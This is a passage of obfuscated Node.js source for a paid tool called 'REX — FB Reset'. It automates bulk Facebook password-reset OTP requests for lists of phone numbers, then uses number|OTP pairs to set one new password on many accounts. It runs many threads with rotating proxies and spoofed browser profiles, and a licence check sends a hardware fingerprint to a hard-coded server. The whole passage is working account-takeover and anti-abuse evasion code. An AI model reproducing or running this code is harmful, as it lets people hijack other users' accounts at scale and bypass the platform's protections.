'EuHvvG', 'tKLQCG', 'rxjYBW', 'CgvYia', 'ywD1qq', 'EMrHDG', 'EdzKEG', 'BhD2oa', 'BgDnuq', 'icHMCG', 'Dg5IzG', 'AMDqtG', 'ALHZtG', 'ENvvEa', 'x3mGzG', 'lYb0Aq', 'mJy3', 'CxvWDW', '8j+hQpcFH6K', 'mhu4zW', 'tuLtuW', 'z2f0zq', 'vu5NqG', 'vuff', 'DNvuDW', 'uwLRyG', 'zK1Ywa', 'muTv', 'quflBq', 'CMrF', 'C2LN', 'y2CZCq', 'y2fHxW', 'x2HZoG', 'zgqTAq', 'yw5PCW', 'zMjuzG', '8j+hUpcFH7G', 'BhzL', 'ywn0Aq', 'B2jPBa', 'ngKXza', 'tw9YBW', 'Benjta', 'r2HHBG', 'y2SG4OAs', 'u1vYDa', 'zwXPBq', 'ru5uia', '8j+hUpcFH7S', 'tuv2sW', 'vKfJEq', 'ywnO', 'B1Pxsq', 'sKrUAa', 'ExrSrW', 'r2ryyq', 'DhLWzq', 'mKH3Da', 'CZOG', 'vwDHBG', 'CKTTra', 'C0LIAa', 'z2v0sq', 'v1nTEq', 'wejoAW', 'zw90sq', 'y3n2sG', 'EunjtW', 'tvj3Dq', 'seeZoa', 'ig51Bq', 'zM8YBa', 'q1qGuG', '8j+hQVcFH7K', 'uIXWDa', 'BKnvzW', 'B3v0zq', 'ANHOta', 'AgKTsq', 'CMfSAq', 'qxr0zq', 'uu13Eq', 'D0fvmq', 'w0nptW', 'DwfXCG', 'zw4Tvq', 'ug9PBG', 'wM1wva', 'uKvkrq', 'sLvRCq', 'r2jrCa', 'yxrHBa', 'qxvZDa', 't2Tsyq', 'su9ooG', 'rtfUsG', 'qwnisa', 'Dg5bqG', 'zhbY', 'A2vKia', 'Dxn0BW', 'sfDjra', 'ihWGCW', 'whDQyq', 'tgfIAW', 'BMqGvq', 'vvfvuW', 're1zzG', 'y2f0yW', 'mJy2', 'txHAqG', 'AuPZBW', 'rf0Grq', 'B2XVCG', 'Afblta', 'BxrFyG', 'igzVDq', 'u0HbmG', 'igfNyq', 'r2fcyW', 'BtrvBG', 'D1zquq', 'reLjAG', 'm3r3za', 'iokaLcbY', 'D1f3vG', 'AgjSCa', 'tLP1BG', 'D3beua', '8j+hRVcFH6K', 'nIbpua', 'nJeYmG', 'CMqGlq', 'tYXZBW', 'zsaOzq', 'DwfUAq', 'icbqBa', 'BfD4za', 'zhn1Ca', 'ierPCW', 'ExbL', 'icPCka', 'sKDvvG', 'txfeyW', 'ks5tzq', 'rerbrG', 'DhHjAW', 'yMTKwa', 'B3zXzG', 'CMvTzq', 'q0zSEq', 'rf0Gsa', 'sMDNBq', 'zgvHua', 't09mia', 'tujfuG', 'tM8GCW', 'r1Hrta', 'Ee1dua', 'zw4Tta', 'swDOrG', 'D0TNAq', 'yunsAa', 'zMv0yW', 'CIbHBa', 'uuf5AG', 'ChzWEG', 'q3C5Cq', 'y2PJBq', 'uuvQBW', 'uhfRAW', 'CNnPBW', 'Evjmva', 'yMDdAa', 'r3vHDa', 'uvvHCa', 'zKjkwq', 'CM4GDa', 'wcXLCW', 'AgrYBG', 'tNfMua', 'mNWZFa', 'weHsvW', 'BNDUoa', 'EvP0tG', 'vYX6Aa', 'CK5utW', 'zYbKAq', 'Av9Rzq', 'qxf0qG', 'B3v0ia', 'ihnLCW', 'q1qUlG', 'Eg1Xrq', 'D2j5mq', 'DMvmAq', 'yMXLuq', 're5wsq', 'yw1tqW', 'mMu3BW', 'zY4UlG', 'rvmGrG', 'BsbJAa', 'qti1nG', 'ndHLrq', 'Dg9gAq', 'vfnpyq', 'z1LWzq', 'z0rbvq', 'AunTAq', 'rcXYBW', 'CxuXza', 'tKzWCW', '8j+hUFcFH6W', 'v09OCq', 'Ce9wzq', 'u3rArG', 'uwLmAq', 'mZCUmW', 'ihjLCW', 'ANvmAG', 'zMLSDa', 'zK1NCa', 'u1Dfsa', 'tK5cAa', 'y1f0va', 'vNDzqW', 's0DgyG', 'sxDJqG', 'vcXLBG', 'BLvPEG', 'rwWGuW', 'n1vWDW', 'CYWGCW', 'CJPWyq', 'ieLZlG', 'u2vUzq', 'q1jpva', 'EKLXEG', 'sLj0Ba', 'zw50ia', 'CJTXpq', 'kYKRja', 'EuvYCG', 'zY0Zyq', 'DgmZjq', 'm0L5rq', 'DgPWsW', 'zgvK', '8j+hRpcFH74', 'zgeTra', 'qLHIDq', 'tw9UDa', 'zY4YlG', 'BxnN', 'wuzjwq', 'mJu3', 'CgrHDa', 'lJKSCG', 'u2rzAW', 'y3rdAq', 'zw4TuW', 'AeTmrG', '8j+hQ/cFH68', 'BK93uq', 'zw4Tua', 'BMnVza', 'tKPeyG', 'BMTtEq', 'AKPTuq', 'CuvnrG', 'B3vUDa', 'rKfjta', 'rNjKCW', 'D2rbqG', 'z2H0', 'x3zHBa', 'Bsi7DG', 'EhK/ia', 'tLrTsW', 'BZe5BW', 'AwLzvq', 'uvz2tG', 'ihWG', 'BuuYzq', 'tYXHCG', 'vuTisa', 'tgjODG', 'yNP2AW', 'rvnMCG', 'zwzHDq', 'CM9Pza', 'Cvz2AG', 'EgDOsG', 'DKfQsq', 'BgqGBG', 'lIb1CG', 'rxHnvG', 'vvHLtq', 'D29Yza', 'v3DezW', 'tgL0Aa', 'lJKSyq', 'ugL4zq', 'vvfqzG', 'wxfRtG', 'zLrKtq', 'rMf6Ba', 'vvnfuG', 'B2rPyq', 'A2vLCa', 'D0T3nG', 'CNPdva', 'DgHV', 'AePVuG', 'ssbRzq', 'l3jHDW', 'DxrL', 'nJG1', 'ow9ODW', 'BZDHma', 'BgWTDG', 'uw5fsq', 'DMXzsa', 'ywCGjG', 'mNvhmq', 'DhrWoG', 'y21vBq', 'BKXlsW', 'CxfAqW', 'rKDmtq', 'icaG', 've9IuG', 'C3vWCa', 'AM56yq', 'D2jdsG', 'B21Tzq', 'xsbqqq', 'ihnLyW', 'DwfSBa', 'twXLEa', 'DLrsDW', 'DZjXBW', 'teHwvG', 'ywXSBW', 'zguTra', 'AgjWua', 'x3nPza'];
  fn1 = function () {
    return v1067;
  };
  return fn1();
}
function printHeader() {
  process.stdout.write("[2J[3J[H"), console.log(C("   ____                                      _  ___              "));
  console.log(C("  / ___|  ___ _ __ __ _ _ __   ___ _ __     | |/ (_)_ __   __ _  ")), console.log(C("  \\___ \\ / __| '__/ _` | '_ \\ / _ \\ '__|    | ' <| | '_ \\ / _` | ")), console.log(C("   ___) | (__| | | (_| | |_) |  __/ |       | . \\| | | | | (_| | ")), console.log(C("  |____/ \\___|_|  \\__,_| .__/ \\___|_|       |_|\\_\\_|_| |_|\\__, | ")), console.log(C("                       |_|                                |___/  \n")), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + C("REX — FB Reset               ") + W('│')), console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│')), console.log(W("│ [•] Version   : ") + C("3.0.5                      ") + W('│')), console.log(W("│ [•] Status    : ") + G("Premium License Verified     ") + W('│'));
  global.CURRENT_HWID && console.log(W("│ [•] Hardware  : ") + Y(global.CURRENT_HWID.padEnd(29)) + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
}
function generateHWID() {
  const {
    execSync: v1068
  } = require("child_process");
  const v1069 = require('os');
  const v1070 = v1069.platform();
  try {
    {
      if (v1070 === "win32") {
        {
          const v1071 = v1068('powershell -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
            'stdio': "pipe",
            'timeout': 0x3a98
          }).toString().trim();
          if (!v1071) throw new Error("No hardware data");
          const v1072 = crypto.createHash("sha256").update(v1071).digest("hex").toUpperCase();
          return "SKING-" + v1072.substring(0, 8) + '-' + v1072.substring(8, 12) + '-' + v1072.substring(12, 16);
        }
      } else {
        {
          let v1073 = [];
          try {
            const v1076 = v1068("settings get secure android_id 2>/dev/null || echo \"\"", {
              'stdio': "pipe",
              'timeout': 0x1388
            }).toString().trim();
            if (v1076 && v1076 !== "null") v1073.push('A:' + v1076);
          } catch (v1077) {}
          try {
            {
              if (fs.existsSync("/proc/cpuinfo")) {
                const v1078 = fs.readFileSync("/proc/cpuinfo", "utf8"),
                  v1079 = v1078.match(/Serial\s*:\s*(\S+)/i),
                  v1080 = v1078.match(/Hardware\s*:\s*(.+)/i);
                if (v1079 && v1079[1] !== "0000000000000000") v1073.push('S:' + v1079[1].trim());
                if (v1080) v1073.push('H:' + v1080[1].trim());
              }
            }
          } catch (v1081) {}
          try {
            {
              if (fs.existsSync("/etc/machine-id")) {
                const v1082 = fs.readFileSync("/etc/machine-id", "utf8").trim();
                if (v1082) v1073.push('M:' + v1082);
              }
            }
          } catch (v1083) {}
          try {
            const v1084 = v1069.cpus(),
              v1085 = v1084 && v1084.length > 0 ? v1084[0].model : "UnknownCPU",
              v1086 = v1069.totalmem(),
              v1087 = v1069.release(),
              v1088 = v1069.hostname();
            v1073.push('F:' + v1085 + '|' + v1086 + '|' + v1087 + '|' + v1088);
          } catch (v1089) {}
          const v1074 = v1073.join('||'),
            v1075 = crypto.createHash("sha256").update(v1074).digest("hex").toUpperCase();
          return "ANKING-" + v1075.substring(0, 8) + '-' + v1075.substring(8, 12) + '-' + v1075.substring(12, 16);
        }
      }
    }
  } catch (v1090) {
    return '';
  }
}
function verifyServerSignature(v1091, v1092) {
  if (!v1092) return false;
  const v1093 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
  try {
    return crypto.verify(null, Buffer.from(v1091, "utf8"), v1093, Buffer.from(v1092, "base64"));
  } catch (v1094) {
    return false;
  }
}
async function validateLicense() {
  console.log("  [33m[*] Validating license...[0m");
  const v1095 = generateHWID.toString(),
    v1096 = crypto.createHash("md5").update(v1095).digest("hex");
  const v1097 = generateHWID();
  if (!v1097) {
    console.error(R("\n  ✗ Could not generate Hardware ID.\n")), process.exit(1);
  }
  const v1098 = generateHWID();
  if (v1098 !== v1097) {
    console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1);
  }
  global.CURRENT_HWID = v1097;
  const v1099 = Date.now();
  try {
    {
      const v1100 = "188.137.176.163",
        v1101 = await new Promise((v1102, v1103) => {
          {
            const v1104 = {};
            v1104.hwid = v1097, v1104.app_id = "reset", v1104.version = "2.0.2", v1104.timestamp = v1099;
            const v1105 = JSON.stringify(v1104),
              v1106 = {
                'hostname': v1100,
                'port': 0xec1,
                'path': "/api/verify",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v1105)
                },
                'timeout': 0x2710
              },
              v1107 = http.request(v1106, v1108 => {
                let v1109 = '';
                v1108.on("data", v1110 => v1109 += v1110), v1108.on("end", () => {
                  try {
                    v1102(JSON.parse(v1109));
                  } catch (v1111) {
                    v1103(v1111);
                  }
                });
              });
            v1107.on("error", v1103), v1107.on("timeout", function () {
              this.destroy();
              v1103(new Error("Timeout"));
            }), v1107.write(v1105), v1107.end();
          }
        });
      if (v1101) {
        v1101.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
        if (v1101.status === "banned" || v1101.status === "expired" || !v1101.sig) {
          await new Promise(v1115 => setTimeout(v1115, 2000));
          let v1114 = String(v1101.reason || "NOT REGISTERED");
          if (!v1101.reason && !v1101.sig) v1114 = "NOT REGISTERED / REMOVED";
          console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — RESET TOOL     ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v1097.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v1114.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
        }
        const v1112 = v1097 + "|reset|2.0.2|" + v1099;
        !verifyServerSignature(v1112, v1101.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1));
        let v1113 = v1101.token;
        return !v1113 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1)), setInterval(() => {
          !v1113 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
          const v1116 = {};
          v1116.hwid = v1097, v1116.app_id = "reset", v1116.token = v1113;
          const v1117 = JSON.stringify(v1116),
            v1118 = {
              'hostname': v1100,
              'port': 0xec1,
              'path': "/api/ping",
              'method': "POST",
              'headers': {
                'Content-Type': "application/json",
                'Content-Length': Buffer.byteLength(v1117)
              },
              'timeout': 0x1388
            },
            v1119 = http.request(v1118, v1120 => {
              let v1121 = '';
              v1120.on("data", v1122 => v1121 += v1122), v1120.on("end", () => {
                try {
                  {
                    const v1123 = JSON.parse(v1121);
                    v1123.status === 'ok' && v1123.token ? v1113 = v1123.token : (console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1));
                  }
                } catch (v1124) {
                  console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                }
              });
            });
          v1119.on("error", () => {
            console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
            process.exit(1);
          }), v1119.on("timeout", function () {
            this.destroy();
            console.error(R("\n  ✗ License Server timeout. Exiting...\n"));
            process.exit(1);
          }), v1119.write(v1117);
          v1119.end();
        }, 45000), console.log("  [32m[✓] License valid — Welcome![0m"), global.CURRENT_USER = "Licensed", global.SYNC_STATUS = "up to date", true;
      }
    }
  } catch (v1125) {
    console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.\n")), process.exit(1);
  }
}
async function selectOption(v1126, v1127) {
  return new Promise(v1128 => {
    {
      let v1129 = 0;
      process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn25 = () => {
        {
          {
            process.stdout.write("[2J[H");
            printHeader();
            console.log("   " + chalk.hex("#FCAF45").bold("👑 " + v1126) + '\x0a');
            v1127.forEach((v1130, v1131) => {
              v1131 === v1129 ? console.log("   " + chalk.hex("#00F0FF").bold('➔') + '\x20\x20' + chalk.hex("#00FF88").bold(v1130.name)) : console.log("      " + chalk.hex("#888888")(v1130.name));
            });
            console.log('');
          }
        }
      };
      fn25();
      const fn26 = (v1132, v1133) => {
        v1133.ctrl && v1133.name === 'c' && process.exit(0);
        if (v1133.name === 'up') {
          v1129 = (v1129 - 1 + v1127.length) % v1127.length, fn25();
        } else {
          if (v1133.name === "down") v1129 = (v1129 + 1) % v1127.length, fn25();else v1133.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn26), v1128(v1127[v1129].value));
        }
      };
      process.stdin.on("keypress", fn26);
    }
  });
}
async function promptText(v1134, v1135) {
  return new Promise(v1136 => {
    process.stdout.write('\x20\x20' + FB_CYAN('➔') + '\x20' + FB_GOLD(v1134) + '\x20');
    let v1137 = '';
    if (process.stdin.isTTY) process.stdin.setRawMode(false);
    process.stdin.resume();
    const fn27 = v1138 => {
      const v1139 = v1138.toString();
      if (v1139.includes('\x0a') || v1139.includes('\x0d')) {
        process.stdin.removeListener("data", fn27), v1137 += v1139.split(/[\r\n]/)[0];
        let v1140 = v1137.trim();
        if (v1140.startsWith('\x22') && v1140.endsWith('\x22')) v1140 = v1140.slice(1, -1);else v1140.startsWith('\x27') && v1140.endsWith('\x27') && (v1140 = v1140.slice(1, -1));
        v1136(v1140 || v1135);
      } else v1137 += v1139;
    };
    process.stdin.on("data", fn27);
  });
}
async function pickNumbersSource() {
  process.stdout.write("[2J[H"), printHeader();
  const v1141 = await selectOption("SELECT NUMBER SOURCE", [{
    'name': "📁 Load from file (numbers.txt)",
    'value': "file"
  }, {
    'name': "🌐 Auto fetch from NexaOTP Panel",
    'value': "nexa"
  }]);
  if (v1141 === "nexa") {
    let v1142 = '';
    const v1143 = path.join(__dirname, ".nexa_api_key");
    if (fs.existsSync(v1143)) {
      const v1151 = fs.readFileSync(v1143, "utf8").trim(),
        v1152 = await selectOption("Found saved API Key (..." + v1151.slice(-4) + "). Use it?", [{
          'name': "Yes, use saved key",
          'value': "yes"
        }, {
          'name': "No, enter new key",
          'value': 'no'
        }, {
          'name': "Delete saved key",
          'value': "delete"
        }]);
      if (v1152 === "yes") {
        v1142 = v1151;
      } else v1152 === "delete" && (fs.unlinkSync(v1143), console.log(G("\n   ✗ Saved key deleted.\n")));
    }
    if (!v1142) {
      v1142 = await promptText("Enter NexaOTP API Key:", '');
      const v1153 = {};
      v1153.name = 'No', v1153.value = 'no';
      const v1154 = await selectOption("Save this key for future use?", [{
        'name': "Yes, save it",
        'value': "yes"
      }, v1153]);
      v1154 === "yes" && (fs.writeFileSync(v1143, v1142, "utf8"), console.log(G("\n   ✓ API key saved.\n")));
    }
    let v1144 = [],
      v1145 = true;
    while (v1145) {
      const v1155 = await promptText("Enter range #" + (v1144.length + 1) + " (e.g. 21624485XXX):", '');
      if (v1155) v1144.push(v1155);
      const v1156 = await selectOption("Add another range?", [{
        'name': "Yes",
        'value': "yes"
      }, {
        'name': "No, proceed",
        'value': 'no'
      }]);
      if (v1156 === 'no') v1145 = false;
    }
    const v1146 = await promptText("How many numbers to process? (e.g. 100):", '50'),
      v1147 = parseInt(v1146) || 50,
      v1148 = await selectOption("SELECT NEXA SERVER", [{
        'name': "Server 1 (/get)",
        'value': "/api/v1/numbers/get"
      }, {
        'name': "Server 2 (/p2/get)",
        'value': "/api/v1/numbers/p2/get"
      }, {
        'name': "Server 3 (/p3/get)",
        'value': "/api/v1/numbers/p3/get"
      }]),
      v1149 = {};
    v1149.apiKey = v1142, v1149.ranges = v1144, v1149.totalCount = v1147, v1149.serverEndpoint = v1148;
    const v1150 = {};
    return v1150.numbersFile = "numbers.txt", v1150.nexaConfig = v1149, v1150;
  }
  console.log("   [33mENTER NUMBERS FILE[0m\n");
  console.log("   [90mType the file path or drag & drop the file here[0m\n");
  return {
    'numbersFile': await promptText("Numbers file path (default: numbers.txt):", "numbers.txt"),
    'nexaConfig': null
  };
}
async function selectRetryCount() {
  const v1157 = {};
  v1157.name = "0 Retries (No Retry - Fast)";
  v1157.value = 0x0;
  const v1158 = {};
  v1158.name = "1 Retry (Rotate Proxy Once)", v1158.value = 0x1;
  const v1159 = {};
  v1159.name = "2 Retries", v1159.value = 0x2;
  const v1160 = {};
  v1160.name = "3 Retries (Default)", v1160.value = 0x3;
  const v1161 = {};
  v1161.name = "5 Retries (Maximum)", v1161.value = 0x5;
  const v1162 = [v1157, v1158, v1159, v1160, v1161];
  return await selectOption("SELECT MAX RETRIES FOR BLOCKED/REJECTED NUMBERS", v1162);
}
async function selectThreadCount() {
  return await selectOption("SELECT THREADS", [{
    'name': "15 Threads",
    'value': 0xf
  }, {
    'name': "30 Threads",
    'value': 0x1e
  }, {
    'name': "50 Threads (Default)",
    'value': 0x32
  }, {
    'name': "100 Threads (Fast)",
    'value': 0x64
  }, {
    'name': "200 Threads (Extreme)",
    'value': 0xc8
  }]);
}
async function selectFacebookUrl() {
  const v1163 = {};
  v1163.name = "🎲 Random Rotate (Recommended)", v1163.value = "random";
  const v1164 = {};
  v1164.name = "🇺🇸 English (www.facebook.com)", v1164.value = "www.facebook.com";
  const v1165 = {};
  v1165.name = "🇪🇸 Spanish (es-es.facebook.com)", v1165.value = "es-es.facebook.com";
  const v1166 = {};
  v1166.name = "🇫🇷 French (fr-fr.facebook.com)", v1166.value = "fr-fr.facebook.com";
  const v1167 = {};
  v1167.name = "🇩🇪 German (de-de.facebook.com)";
  v1167.value = "de-de.facebook.com";
  const v1168 = {};
  v1168.name = "🇧🇷 Portuguese (pt-br.facebook.com)", v1168.value = "pt-br.facebook.com";
  const v1169 = {};
  v1169.name = "🇸🇦 Arabic (ar-ar.facebook.com)";
  v1169.value = "ar-ar.facebook.com";
  const v1170 = {};
  v1170.name = "🇮🇹 Italian (it-it.facebook.com)", v1170.value = "it-it.facebook.com";
  const v1171 = {};
  v1171.name = "🇹🇷 Turkish (tr-tr.facebook.com)", v1171.value = "tr-tr.facebook.com";
  const v1172 = [v1163, v1164, v1165, v1166, v1167, v1168, v1169, v1170, v1171];
  return await selectOption("SELECT REGION", v1172);
}
async function selectBrowserProfile() {
  const v1173 = {};
  v1173.name = "🎲 Random Mix  (All 9 Browser Types)", v1173.value = "random";
  const v1174 = {};
  v1174.name = "🌐 Google Chrome (Desktop + Mobile)", v1174.value = "chrome";
  const v1175 = {};
  v1175.name = "📱 Samsung Internet (Mobile)", v1175.value = "samsung";
  const v1176 = {};
  v1176.name = "🦊 Mozilla Firefox (Desktop + Mobile)", v1176.value = "firefox";
  const v1177 = {};
  v1177.name = "🌊 Microsoft Edge (Desktop)", v1177.value = "edge";
  const v1178 = {};
  v1178.name = "🦆 DuckDuckGo (Desktop + Mobile)", v1178.value = "duckduckgo";
  const v1179 = {};
  v1179.name = "🏄 Opera (Desktop + Mobile)", v1179.value = "opera";
  const v1180 = {};
  v1180.name = "🦁 Brave (Desktop + Mobile)", v1180.value = "brave";
  const v1181 = {};
  v1181.name = "🎻 Vivaldi (Desktop)", v1181.value = "vivaldi";
  const v1182 = [v1173, v1174, v1175, v1176, v1177, v1178, v1179, v1180, v1181];
  return await selectOption("SELECT BROWSER PROFILE", v1182);
}
async function selectProxySetup() {
  const v1183 = await selectOption("SELECT PROXY", [{
    'name': "🔌 Direct Connection (No Proxy)",
    'value': "none"
  }, {
    'name': "🔗 Single Proxy String",
    'value': "single"
  }, {
    'name': "📄 Proxy File (Rotation)",
    'value': "file"
  }]);
  if (v1183 === "single") {
    process.stdout.write("[2J[H"), printHeader(), console.log("   " + chalk.hex("#FCAF45").bold("ENTER PROXY") + '\x0a'), console.log("   " + chalk.hex("#888888")("Formats: ip:port:user:pass / socks5://user:pass@ip:port")), console.log("   " + chalk.hex("#888888")("         host:port@user:pass / http://user:pass@ip:port") + '\x0a');
    const v1184 = await promptText("Proxy string:", '');
    v1184 && (proxyManager.load(v1184), dbg("Single proxy loaded: " + proxyManager.proxies.length + " proxy"));
  } else {
    if (v1183 === "file") {
      process.stdout.write("[2J[H"), printHeader(), console.log("   " + chalk.hex("#FCAF45").bold("ENTER PROXY FILE") + '\x0a'), console.log("   " + chalk.hex("#888888")("Type file path or drag & drop (default: proxies.txt)") + '\x0a');
      const v1185 = await promptText("Proxy file path (default: proxies.txt):", "proxies.txt");
      if (v1185 && fs.existsSync(v1185)) proxyManager.load(v1185), dbg("Proxy file loaded: " + proxyManager.proxies.length + " proxies");else v1185 && (console.log(R("  [!] Proxy file not found: " + v1185 + ". Running direct.")), await sleep(2000));
    }
  }
  return v1183;
}
async function selectRetryCount() {
  const v1186 = {};
  v1186.name = "0 Retries  (Process once, no retries)", v1186.value = 0x0;
  const v1187 = {};
  v1187.name = "1 Retry    (Retry wrong OTP / timeout 1 time)", v1187.value = 0x1;
  const v1188 = {};
  v1188.name = "2 Retries  (Retry wrong OTP / timeout 2 times)", v1188.value = 0x2;
  const v1189 = {};
  v1189.name = "3 Retries  (Recommended - 3 times)", v1189.value = 0x3;
  const v1190 = {};
  v1190.name = "5 Retries  (Maximum effort - 5 times)";
  v1190.value = 0x5;
  const v1191 = {};
  v1191.name = "✏️  Custom   (enter manually)", v1191.value = "custom";
  const v1192 = [v1186, v1187, v1188, v1189, v1190, v1191],
    v1193 = await selectOption("RETRY SETTINGS (Wrong OTP & Timeouts)", v1192);
  if (v1193 === "custom") {
    process.stdout.write("[2J[H"), printHeader();
    const v1194 = await promptText("Enter retry count for wrong OTP / timeouts (0-10):", '3');
    return Math.max(0, Math.min(10, parseInt(v1194) || 0));
  }
  return v1193;
}
async function confirmConfiguration(v1195, v1196, v1197) {
  return await selectOption("Confirm: File=" + v1195 + ", Threads=" + v1196 + ", Browser=" + v1197, [{
    'name': "✅ LAUNCH",
    'value': true
  }, {
    'name': "❌ Cancel",
    'value': false
  }]);
}
async function main() {
  syncUAAndHost();
  const v1198 = process.env.SKING_UI === '1';
  if (!v1198) {
    process.stdout.write("[2J[3J[H");
  }
  const v1199 = process.argv.slice(2).filter(v1207 => !v1207.startsWith('--'));
  let v1200,
    v1201 = 15,
    v1202,
    v1203 = null,
    v1204 = 0,
    v1205 = 3;
  if (v1199.length >= 1 && fs.existsSync(v1199[0])) {
    v1200 = v1199[0], v1201 = parseInt(v1199[1]) || 50, v1202 = v1199[0];
    v1199[3] && v1199[3].trim() && (proxyManager.load(v1199[3]), dbg("Proxy set: " + proxyManager.proxies.length + " proxies loaded"));
    v1199[5] && v1199[5].trim() && (SELECTED_BROWSER = v1199[5].trim());
    const v1208 = await validateLicense();
    if (!v1208) {
      console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1);
    }
  } else {
    const v1209 = await validateLicense();
    if (!v1209) {
      console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1);
    }
    await sleep(1500);
    const v1210 = setInterval(() => {}, 10000);
    try {
      const v1211 = await selectOption("SELECT MODE", [{
        'name': "📲 Send OTP (Reset Trigger)",
        'value': "send_otp"
      }, {
        'name': "🔐 Confirm Account (OTP → Change Password)",
        'value': "confirm"
      }]);
      if (v1211 === "confirm") {
        process.stdout.write("[2J[H"), printHeader(), console.log("   " + chalk.hex("#FCAF45").bold("CONFIRM MODE") + " — " + chalk.hex("#888888")("Input file format: number|otp (one per line)") + '\x0a'), console.log("   " + chalk.hex("#555555")("Example: +12345678901|394172") + '\x0a');
        const v1216 = await promptText("Enter pairs file path (default: pairs.txt):", "pairs.txt"),
          v1217 = v1216.replace(/^["']|["']$/g, '').trim();
        !fs.existsSync(v1217) && (console.log(R("\n  ✗ File not found: " + v1217 + '\x0a')), process.exit(1));
        const v1218 = fs.readFileSync(v1217, "utf8").split(/\r?\n/).map(v1227 => v1227.trim()).filter(v1228 => v1228),
          v1219 = v1218.map(v1229 => {
            let v1230, v1231;
            if (v1229.includes('|')) {
              {
                const v1232 = v1229.split('|');
                v1230 = v1232[0].trim(), v1231 = v1232[1] ? v1232[1].trim() : '';
              }
            } else {
              const v1233 = v1229.match(/^(\S+)\s+(\S+)$/);
              if (v1233) {
                v1230 = v1233[1].trim(), v1231 = v1233[2].trim();
              }
            }
            return v1230 && v1231 ? [v1230, v1231] : null;
          }).filter(Boolean);
        v1219.length === 0 && (console.log(R("\n  ✗ No valid pairs found. Supported formats:\n  +number|otp\n  +number otp\n")), process.exit(1));
        console.log("\n   " + G("Loaded") + '\x20' + Y(v1219.length) + '\x20' + G("pairs.") + '\x0a');
        const v1220 = await promptText("Enter new password to set for all accounts:", "Password@2026"),
          v1221 = await selectOption("SELECT THREADS", [{
            'name': "1 Thread  (Serial - Safest)",
            'value': 0x1
          }, {
            'name': "3 Threads",
            'value': 0x3
          }, {
            'name': "5 Threads",
            'value': 0x5
          }, {
            'name': "10 Threads",
            'value': 0xa
          }, {
            'name': "15 Threads",
            'value': 0xf
          }, {
            'name': "✏️  Custom (enter manually)",
            'value': "custom"
          }]);
        if (v1221 === "custom") {
          process.stdout.write("[2J[H"), printHeader();
          const v1234 = await promptText("Enter thread count (1-50):", '5');
          v1201 = Math.max(1, Math.min(50, parseInt(v1234) || 5));
        } else v1201 = v1221;
        SELECTED_BROWSER = await selectBrowserProfile(), syncUAAndHost(), await selectProxySetup(), v1205 = await selectRetryCount();
        const v1222 = await selectOption("Confirm: " + v1219.length + " pairs, Password: " + v1220 + ", Threads: " + v1201 + ", Retries: " + v1205, [{
          'name': "✅ LAUNCH CONFIRM MODE",
          'value': true
        }, {
          'name': "❌ Cancel",
          'value': false
        }]);
        !v1222 && (console.log(R("\n  Cancelled.\n")), process.exit(0));
        process.stdin.pause(), clearInterval(v1210), await sleep(500);
        const {
          confirmed: v1223,
          checkpointed: v1224,
          outFile: v1225,
          checkpointFile: v1226
        } = await runConfirmMode(v1219, v1220, v1201, v1217, v1205);
        console.log(''), console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  REX — CONFIRM ACCOUNT — COMPLETE          ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Confirmed") + "    " + chalk.greenBright(String(v1223.length).padStart(6)) + "                  ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.hex("#FF4466")("Checkpoint") + "   " + chalk.hex("#FF4466")(String(v1224.length).padStart(6)) + "                  ") + C('║')), console.log(C("  ║") + ('\x20\x20' + G("Total") + "        " + G(String(v1219.length).padStart(6)) + "                  ") + C('║'));
        if (v1223.length > 0) {
          console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Saved Confirmed") + '\x20\x20' + chalk.cyan(v1225.padEnd(18)) + '\x20\x20') + C('║'));
        }
        if (v1224.length > 0) {
          console.log(C("  ║") + ('\x20\x20' + chalk.hex("#FF4466")("Saved Checkpoint") + '\x20' + chalk.hex("#FF4466")(v1226.padEnd(18)) + '\x20\x20') + C('║'));
        }
        console.log(C("  ╚════════════════════════════════════════════╝\n")), process.exit(0);
      }
